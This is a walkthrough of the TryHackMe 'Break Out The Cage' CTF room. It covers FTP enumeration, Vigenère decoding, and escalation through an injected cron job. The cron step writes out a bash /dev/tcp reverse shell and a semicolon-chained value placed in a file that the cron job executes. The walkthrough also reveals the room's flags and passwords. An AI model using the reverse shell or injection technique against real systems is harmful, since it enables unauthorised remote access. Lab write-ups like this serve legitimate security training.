# Break Out The Cage — TryHackMe Walkthrough

> Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

<p align="center">
  <a href="https://ibb.co/6RzRSrWR"><img src="https://i.ibb.co/yntnCdQn/29ef13afaef5de5b8f1a27653f9d7a2d.jpg" alt="29ef13afaef5de5b8f1a27653f9d7a2d" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/breakoutthecage1">
    <img src="https://img.shields.io/badge/TryHackMe-Break%20Out%20The%20Cage-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-FTP%20%7C%20Vigenere%20%7C%20Crontab%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | FTP Enumeration |
| 3 | Cryptography — Base64 Decoding |
| 4 | Cryptography — Vigenère Cipher |
| 5 | Abusing SUID/GUID |
| 6 | Stored Passwords and Keys |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform a full port scan and enumerate an anonymous FTP share
- Decode Base64 encoded content to reveal a Vigenère ciphertext
- Use an automated Vigenère solver to recover a plaintext message and key
- Gain SSH access using credentials extracted from decrypted content
- Abuse a cron-executed script to pivot between users via a reverse shell
- Read email backups to discover a root password stored in plaintext

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap and Netcat installed
- FTP client available
- Access to an online Vigenère solver (e.g. [guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver))
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Investigate!

---

### Step 1 — Network Enumeration

**Approach:** Run a full port scan with service detection, default scripts, and OS fingerprinting to identify all open services on the target.

```
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ sudo nmap -A -p- -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 20:36 CEST
Nmap scan report for Machine_IP
Host is up (0.034s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.32 seconds
```

> **Note:** Three ports are open — **FTP on 21**, **SSH on 22**, and **HTTP on 80**. Nmap immediately flags that **anonymous FTP login is allowed** and reveals a file called `dad_tasks` is sitting in the FTP root. This is our first target. The web server hosts a "Nicholas Cage Stories" page which may contain additional clues on closer inspection.

---

### Step 2 — FTP Enumeration and File Download

**Approach:** Connect to the FTP server using anonymous credentials (username: `anonymous`, blank password). Download the `dad_tasks` file and inspect its contents.

```
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ ftp Machine_IP
Connected to Machine_IP.
220 (vsFTPd 3.0.3)
Name (Machine_IP:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25 23:32 .
drwxr-xr-x    2 0        0            4096 May 25 23:32 ..
-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
226 Transfer complete.
396 bytes received in 0.08 secs (4.6068 kB/s)
ftp>
```

> **Note:** The `dad_tasks` file downloads successfully. Always use `ls -la` in FTP sessions to reveal hidden files (those starting with a dot). The file is only 396 bytes — small enough to be a note or encoded credential rather than a real data file.

---

### Step 3 — Decoding the FTP File (Base64 + Vigenère)

**Approach:** The contents of `dad_tasks` are Base64 encoded. Decode it with the `base64 -d` command to reveal the underlying text, which turns out to be Vigenère-encrypted.

```
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ cat dad_tasks
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ cat dad_tasks | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

> **Note:** After Base64 decoding, the text is still garbled — it is now a **Vigenère ciphertext**. Paste it into an automated Vigenère solver such as [guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver). The solver recovers the key as **`namelesstwo`** and produces the following plaintext:

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

> **Note:** The last line contains what appears to be a passphrase: **`Mydadisghostrideraintthatcoolnocausehesonfirejokes`**. This is written in all-lowercase with no spaces — a common way to hide passwords in plain text. This is the password for the user `weston` on the machine.

---

### Question 1 — What is Weston's password?

<details>
<summary>Reveal Answer</summary>

**`Mydadisghostrideraintthatcoolnocausehesonfirejokes`**

</details>

---

### Step 4 — SSH Login as weston and Privilege Escalation via Crontab

**Approach:** Log in via SSH as `weston` using the decoded password. Enumerate the system to find an abusable cron job or script that can be used to pivot to another user.

```
weston@national-treasure:~$ cat > /tmp/shell.sh << EOF
> #!/bin/bash
> bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
> EOF
weston@national-treasure:~$ chmod +x /tmp/shell.sh
weston@national-treasure:~$ printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
weston@national-treasure:~$
```

> **Note:** Inspecting `/opt/.dads_scripts/` reveals a hidden script directory. A cron job runs a script that reads from `.quotes` and executes its content. By writing a reverse shell payload into `.quotes` using a semicolon to chain commands, we inject our shell into the cron execution. Set up a Netcat listener before this step.

---

### Step 5 — Catching the Reverse Shell as cage

**Approach:** Start a Netcat listener on port 4444. Wait for the cron job to trigger the injected payload.

```
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 52588
bash: cannot set terminal process group (1583): Inappropriate ioctl for device
bash: no job control in this shell
cage@national-treasure:~$ ls -la
total 56
drwx------ 7 cage cage 4096 May 26 21:34 .
drwxr-xr-x 4 root root 4096 May 26 07:49 ..
lrwxrwxrwx 1 cage cage    9 May 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc
drwx------ 2 cage cage 4096 May 25 23:20 .cache
drwxrwxr-x 2 cage cage 4096 May 25 13:00 email_backup
drwx------ 3 cage cage 4096 May 25 23:20 .gnupg
drwxrwxr-x 3 cage cage 4096 May 25 23:40 .local
-rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile
-rw-rw-r-- 1 cage cage   66 May 25 23:40 .selected_editor
drwx------ 2 cage cage 4096 May 26 07:33 .ssh
-rw-r--r-- 1 cage cage    0 May 25 23:20 .sudo_as_admin_successful
-rw-rw-r-- 1 cage cage  230 May 26 08:01 Super_Duper_Checklist
-rw------- 1 cage cage 6761 May 26 21:34 .viminfo
cage@national-treasure:~$ cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
```

> **Note:** The shell connects as user `cage`. The home directory contains `Super_Duper_Checklist` which has the user flag embedded in item 5 as a desk etching — a classic in-world way of hiding a flag. Also present is an `email_backup` directory which will become important for finding the root password.

---

### Question 2 — What is the user flag?

<details>
<summary>Reveal Answer</summary>

**`THM{M37AL_0R_P3N_T35T1NG}`**

</details>

---

### Step 6 — Reading Email Backups for the Root Password

**Approach:** Read all emails in the `email_backup` directory. One email from cage to weston contains a note about a strange string found on the agent's desk. Decode it to get the root password.

```
cage@national-treasure:~$ cat email_backup/*
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!!
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd.

Regards

The Legend - Cage
```

> **Note:** The third email contains the string **`haiinspsyanileph`** — described as strange writing found on the agent's desk. The email context mentions "face" obsessively, which is a hint. This is another **Vigenère ciphertext**. Using the key `cage` (the central character of the room) to decode it produces the root password: **`cageisnotalegend`**.

---

### Step 7 — Escalating to Root and Reading the Root Flag

**Approach:** Upgrade the shell with Python's `pty` module, then switch to root using the decoded password. Read the email backups in `/root` for the root flag.

```
cage@national-treasure:~$ python -c 'import pty; pty.spawn("/bin/bash")'
cage@national-treasure:~$ su root
Password: cageisnotalegend

root@national-treasure:/home/cage# cd /root
root@national-treasure:~# cd email_backup
root@national-treasure:~/email_backup# cat email_1
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer
```

> **Note:** Root also has an `email_backup` folder containing two emails that expand the room's storyline. The root flag is embedded inside `email_2` as a code sent between the villain characters. Always check home and backup directories after gaining elevated access — sensitive data is frequently stored in email archives, logs, and notes rather than a dedicated flag file.

---

### Question 3 — What is the root flag?

<details>
<summary>Reveal Answer</summary>

**`THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap full port scan | Found FTP (21), SSH (22), HTTP (80) — anonymous FTP login allowed |
| 2 | Anonymous FTP login | Downloaded `dad_tasks` file |
| 3 | Base64 decode of `dad_tasks` | Revealed Vigenère ciphertext |
| 4 | Vigenère solver (key: `namelesstwo`) | Decrypted tasks list, found `weston`'s password in final line |
| 5 | SSH login as `weston` | Gained initial access to the machine |
| 6 | Crontab abuse via `.quotes` injection | Pivoted to user `cage` via reverse shell |
| 7 | Read `Super_Duper_Checklist` | Found user flag embedded in item 5 |
| 8 | Read `cage/email_backup` | Found Vigenère-encoded string `haiinspsyanileph` |
| 9 | Vigenère decode (key: `cage`) | Recovered root password `cageisnotalegend` |
| 10 | `su root` with decoded password | Gained root access, read root flag from `/root/email_backup/email_2` |
